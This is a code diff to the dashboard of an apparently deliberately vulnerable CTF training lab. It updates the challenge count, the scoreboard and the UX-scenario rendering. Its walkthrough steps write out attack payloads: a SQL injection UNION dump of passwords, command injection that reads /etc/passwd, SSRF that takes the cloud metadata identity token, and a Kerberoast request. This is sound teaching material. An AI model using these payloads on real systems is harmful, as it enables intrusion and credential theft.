@@ -76,7 +76,7 @@
 
     <!-- Stats Overview -->
     <div class="stats-bar">
-      <div class="stat-box"><div class="stat-label">Total Challenges</div><div class="stat-value">18</div></div>
+      <div class="stat-box"><div class="stat-label">Total Challenges</div><div class="stat-value">10</div></div>
       <div class="stat-box"><div class="stat-label">Flags Captured</div><div class="stat-value success" id="flags-captured">0</div></div>
       <div class="stat-box"><div class="stat-label">OWASP Categories</div><div class="stat-value info">8</div></div>
       <div class="stat-box"><div class="stat-label">GOAD Targets</div><div class="stat-value" style="color:var(--purple)">3</div></div>
@@ -441,7 +441,7 @@
           <div class="guide-step-num">2</div>
           <div class="guide-step-content">
             <h4>Access your own order (normal behavior)</h4>
-            <div class="guide-cmd">curl -s http://TARGET/api/v1/ctf/orders/1001 | jq .</div>
+            <div class="guide-cmd">curl -s http://CTF_TARGET/api/v1/ctf/orders/1001 | jq .</div>
             <div class="guide-note">This returns your own order — legitimate access.</div>
           </div>
         </div>
@@ -449,7 +449,7 @@
           <div class="guide-step-num">3</div>
           <div class="guide-step-content">
             <h4>Change the ID to access another user's order</h4>
-            <div class="guide-cmd">curl -s http://TARGET/api/v1/ctf/orders/1002 | jq .</div>
+            <div class="guide-cmd">curl -s http://CTF_TARGET/api/v1/ctf/orders/1002 | jq .</div>
             <p>The server returns the order without checking ownership. Look for the flag in the response.</p>
           </div>
         </div>
@@ -475,7 +475,7 @@
           <div class="guide-step-num">1</div>
           <div class="guide-step-content">
             <h4>Test for injection</h4>
-            <div class="guide-cmd">curl -s "http://TARGET/api/v1/users/search?q='" </div>
+            <div class="guide-cmd">curl -s "http://CTF_TARGET/api/v1/users/search?q='" </div>
             <p>If the server returns a SQL error, the parameter is injectable.</p>
           </div>
         </div>
@@ -483,7 +483,7 @@
           <div class="guide-step-num">2</div>
           <div class="guide-step-content">
             <h4>Extract data with UNION</h4>
-            <div class="guide-cmd">curl -s "http://TARGET/api/v1/users/search?q=' UNION SELECT username,password FROM users--" | jq .</div>
+            <div class="guide-cmd">curl -s "http://CTF_TARGET/api/v1/users/search?q=' UNION SELECT username,password FROM users--" | jq .</div>
             <div class="guide-warning">This dumps all usernames and password hashes from the database.</div>
           </div>
         </div>
@@ -509,7 +509,7 @@
           <div class="guide-step-num">1</div>
           <div class="guide-step-content">
             <h4>Test for command injection</h4>
-            <div class="guide-cmd">curl -s "http://TARGET/api/v1/system/diagnostics?cmd=id"</div>
+            <div class="guide-cmd">curl -s "http://CTF_TARGET/api/v1/system/diagnostics?cmd=id"</div>
             <p>If the server returns the output of <code>id</code>, you have RCE.</p>
           </div>
         </div>
@@ -517,7 +517,7 @@
           <div class="guide-step-num">2</div>
           <div class="guide-step-content">
             <h4>Chain commands</h4>
-            <div class="guide-cmd">curl -s "http://TARGET/api/v1/system/diagnostics?cmd=id;whoami;cat /etc/passwd"</div>
+            <div class="guide-cmd">curl -s "http://CTF_TARGET/api/v1/system/diagnostics?cmd=id;whoami;cat /etc/passwd"</div>
             <div class="guide-warning">The semicolon <code>;</code> and pipe <code>|</code> characters allow chaining multiple OS commands.</div>
           </div>
         </div>
@@ -543,7 +543,7 @@
           <div class="guide-step-num">1</div>
           <div class="guide-step-content">
             <h4>Target the cloud metadata endpoint</h4>
-            <div class="guide-cmd">curl -s "http://TARGET/api/v1/got/dragons?url=http://169.254.169.254/opc/v2/instance/"</div>
+            <div class="guide-cmd">curl -s "http://CTF_TARGET/api/v1/got/dragons?url=http://169.254.169.254/opc/v2/instance/"</div>
             <p>The IMDS endpoint at 169.254.169.254 is only accessible from within the cloud instance. SSRF lets you reach it through the application.</p>
           </div>
         </div>
@@ -551,7 +551,7 @@
           <div class="guide-step-num">2</div>
           <div class="guide-step-content">
             <h4>Steal instance identity</h4>
-            <div class="guide-cmd">curl -s "http://TARGET/api/v1/got/dragons?url=http://169.254.169.254/opc/v2/identity/token"</div>
+            <div class="guide-cmd">curl -s "http://CTF_TARGET/api/v1/got/dragons?url=http://169.254.169.254/opc/v2/identity/token"</div>
             <div class="guide-warning">On OCI, this retrieves the instance principal token — equivalent to stealing the VM's IAM credentials.</div>
           </div>
         </div>
@@ -584,7 +584,7 @@
           <div class="guide-step-num">2</div>
           <div class="guide-step-content">
             <h4>Trigger via the portal</h4>
-            <div class="guide-cmd">curl -s "http://TARGET/portal/api/goad/kerberoast" -H "Authorization: Bearer &lt;token&gt;"</div>
+            <div class="guide-cmd">curl -s "http://CTF_TARGET/portal/api/goad/kerberoast" -H "Authorization: Bearer &lt;token&gt;"</div>
             <p>The portal sends the Kerberoast request to the GOAD domain controller and returns any captured TGS tickets.</p>
           </div>
         </div>
@@ -605,7 +605,7 @@
   <div class="tab-panel" id="tab-scoreboard">
     <div class="section-header">
       <h2 class="section-title">CTF Scoreboard</h2>
-      <span class="badge badge-flag" id="score-badge">0 / 18 Flags</span>
+      <span class="badge badge-flag" id="score-badge">0 / 10 Flags</span>
     </div>
     <div id="scoreboard-content">
       <p style="color:var(--text-secondary);margin-bottom:24px">Capture flags by successfully exploiting vulnerabilities. Each flag is hidden in the server response.</p>
@@ -620,6 +620,87 @@
   // State
   let totalRequests = 0, totalErrors = 0, latencies = [], flagsCaptured = new Set(), otelSpanCount = 0;
 
+  // Dynamic TARGET replacement — inject actual server URL into walkthrough commands
+  const CTF_BASE = window.location.origin;
+  document.querySelectorAll('.guide-cmd').forEach(el => {
+    el.textContent = el.textContent.replace(/http:\/\/CTF_TARGET/g, CTF_BASE);
+  });
+
+  // Challenge definitions for scoreboard and UX tab
+  const CHALLENGES = [
+    { id: 'idor', name: 'Mission 1: IDOR', category: 'A01', severity: 'high' },
+    { id: 'lfi', name: 'Mission 2: Path Traversal', category: 'A01', severity: 'critical' },
+    { id: 'ssti', name: 'Mission 3: SSTI', category: 'A03', severity: 'critical' },
+    { id: 'xss', name: 'Mission 4: Reflected XSS', category: 'A03', severity: 'high' },
+    { id: 'xxe', name: 'Mission 5: XXE Injection', category: 'A05', severity: 'critical' },
+    { id: 'deserialization', name: 'Mission 6: Deserialization', category: 'A08', severity: 'critical' },
+    { id: 'sqli', name: 'SQL Injection', category: 'A03', severity: 'critical' },
+    { id: 'rce', name: 'Command Injection (RCE)', category: 'A03', severity: 'critical' },
+    { id: 'goad-sqli', name: 'Mission 7: The Wall (MSSQL)', category: 'GOAD', severity: 'critical' },
+    { id: 'ssrf', name: 'Mission 8: Dragon Eggs (SSRF)', category: 'GOAD', severity: 'critical' },
+  ];
+
+  const UX_SCENARIOS = [
+    { endpoint: '/app/slow-query', icon: '&#128012;', name: 'Slow Database Query', desc: 'Simulates a 2-30s DB query delay. APM span exceeds the 5s threshold.', badge: 'Warning', trace: 'APM Duration' },
+    { endpoint: '/app/error-page', icon: '&#128165;', name: 'Application Error (500)', desc: 'Triggers NullPointerException. Error span with stack trace in OCI Logging.', badge: 'Error', trace: 'Error Span' },
+    { endpoint: '/app/cascade-failure', icon: '&#128279;', name: 'Cascade Failure (503)', desc: 'Upstream payment-service unavailable. Circuit breaker OPEN in trace waterfall.', badge: 'Critical', trace: 'Circuit Breaker' },
+    { endpoint: '/app/hard-load', icon: '&#128230;', name: 'Heavy Page Load (~1MB)', desc: 'Returns ~1MB HTML. RUM shows LCP >4s. Visible in APM Browser agent.', badge: 'Warning', trace: 'RUM / LCP' },
+    { endpoint: '/app/timeout', icon: '&#9201;', name: 'Request Timeout (30s+)', desc: 'Request hangs for 35 seconds. No response span — times out before completion.', badge: 'Critical', trace: 'Timeout' },
+    { endpoint: '/app/memory-pressure', icon: '&#129504;', name: 'Memory Pressure / GC Pause', desc: 'Simulates GC pause (500ms-5s) with heap at 70-95%. Observable as latency spikes.', badge: 'Warning', trace: 'GC Metrics' },
+    { endpoint: '/app/intermittent-error', icon: '&#127922;', name: 'Intermittent Error (50%)', desc: 'Random 50% failure rate. Simulates flaky upstream — hard to diagnose without tracing.', badge: 'Error', trace: 'Error Rate' },
+    { endpoint: '/app/bad-gateway', icon: '&#128683;', name: 'Bad Gateway (502)', desc: 'Upstream inventory-service returns invalid response. 502 span in APM waterfall.', badge: 'Error', trace: '502 Span' },
+  ];
+
+  // Populate UX Scenarios tab
+  (function buildUxTab() {
+    const grid = document.getElementById('ux-scenarios-grid');
+    if (!grid) return;
+    const badgeClass = { Warning: 'badge-medium', Error: 'badge-high', Critical: 'badge-critical' };
+    grid.innerHTML = UX_SCENARIOS.map(s => `
+      <div class="challenge-card" onclick="fireUxScenario('${s.endpoint}', this)">
+        <div class="card-top">
+          <span class="card-icon">${s.icon}</span>
+          <div class="card-badges"><span class="badge ${badgeClass[s.badge] || 'badge-medium'}">${s.badge}</span></div>
+        </div>
+        <div class="card-title">${s.name}</div>
+        <div class="card-desc">${s.desc}</div>
+        <div class="card-footer">
+          <span class="card-endpoint">GET ${s.endpoint}</span>
+          <span class="card-otel">&#128269; ${s.trace}</span>
+        </div>
+      </div>
+    `).join('');
+  })();
+
+  // Track which challenge IDs have been solved
+  const solvedChallenges = new Set();
+
+  // Populate Scoreboard tab
+  function renderScoreboard() {
+    const grid = document.getElementById('scoreboard-grid');
+    if (!grid) return;
+    const badgeClass = { high: 'badge-high', critical: 'badge-critical', medium: 'badge-medium' };
+    grid.innerHTML = CHALLENGES.map(c => {
+      const solved = solvedChallenges.has(c.id);
+      return `
+        <div class="challenge-card${solved ? ' solved' : ''}" style="cursor:default">
+          <div class="card-top">
+            <span class="card-icon">${solved ? '&#9989;' : '&#128274;'}</span>
+            <div class="card-badges">
+              <span class="badge ${badgeClass[c.severity] || 'badge-medium'}">${c.severity}</span>
+              <span class="badge badge-ctf">${c.category}</span>
+            </div>
+          </div>
+          <div class="card-title">${c.name}</div>
+          <div class="card-footer">
+            <span class="card-endpoint">${c.id}</span>
+            <span class="card-otel">${solved ? '&#127937; Captured' : '&#128274; Locked'}</span>
+          </div>
+        </div>`;
+    }).join('');
+  }
+  renderScoreboard();
+
   // Tab switching
   document.querySelectorAll('.nav-links a').forEach(link => {
     link.addEventListener('click', e => {
@@ -629,6 +710,7 @@
       link.classList.add('active');
       document.querySelectorAll('.tab-panel').forEach(p => p.classList.remove('active'));
       document.getElementById('tab-' + tab).classList.add('active');
+      if (tab === 'scoreboard') renderScoreboard();
     });
   });
 
@@ -671,11 +753,12 @@
       const flagMatch = text.match(/FLAG\{[^}]+\}/);
       if (flagMatch && !flagsCaptured.has(flagMatch[0])) {
         flagsCaptured.add(flagMatch[0]);
+        solvedChallenges.add(challengeId);
         flagBanner.textContent = flagMatch[0];
         flagBanner.style.display = 'block';
         cardEl.classList.add('solved');
         document.getElementById('flags-captured').textContent = flagsCaptured.size;
-        document.getElementById('score-badge').textContent = flagsCaptured.size + ' / 18 Flags';
+        document.getElementById('score-badge').textContent = flagsCaptured.size + ' / 10 Flags';
       }
     } catch (err) {
       const elapsed = Math.round(performance.now() - start);
@@ -729,12 +812,59 @@
       const flagMatch = text.match(/FLAG\{[^}]+\}/);
       if (flagMatch && !flagsCaptured.has(flagMatch[0])) {
         flagsCaptured.add(flagMatch[0]);
+        solvedChallenges.add(challengeId);
         flagBanner.textContent = flagMatch[0];
         flagBanner.style.display = 'block';
         cardEl.classList.add('solved');
         document.getElementById('flags-captured').textContent = flagsCaptured.size;
-        document.getElementById('score-badge').textContent = flagsCaptured.size + ' / 18 Flags';
+        document.getElementById('score-badge').textContent = flagsCaptured.size + ' / 10 Flags';
       }
+    } catch (err) {
+      const elapsed = Math.round(performance.now() - start);
+      latencies.push(elapsed);
+      status.textContent = 'FAILED';
+      lat.textContent = elapsed + 'ms';
+      content.textContent = err.message;
+      dot.className = 'status-dot err';
+      totalErrors++;
+    }
+
+    cardEl.classList.remove('loading');
+    updateMetrics();
+  }
+
+  // Fire a UX scenario (uses UX tab response panel)
+  async function fireUxScenario(url, cardEl) {
+    const panel = document.getElementById('ux-response-panel');
+    const content = document.getElementById('ux-resp-content');
+    const status = document.getElementById('ux-resp-status');
+    const lat = document.getElementById('ux-resp-latency');
+    const dot = document.getElementById('ux-resp-dot');
+
+    cardEl.classList.add('loading');
+    panel.classList.add('visible');
+    content.textContent = 'Loading...';
+
+    const start = performance.now();
+    totalRequests++;
+    otelSpanCount++;
+    updateMetrics();
+
+    try {
+      const resp = await fetch(url);
+      const elapsed = Math.round(performance.now() - start);
+      latencies.push(elapsed);
+      const text = await resp.text();
+
+      let formatted;
+      try { formatted = JSON.stringify(JSON.parse(text), null, 2); }
+      catch { formatted = text.substring(0, 3000); }
+
+      status.textContent = 'HTTP ' + resp.status;
+      lat.textContent = elapsed + 'ms';
+      content.textContent = formatted;
+      dot.className = resp.ok ? 'status-dot ok' : 'status-dot err';
+      if (!resp.ok) totalErrors++;
     } catch (err) {
       const elapsed = Math.round(performance.now() - start);
       latencies.push(elapsed);
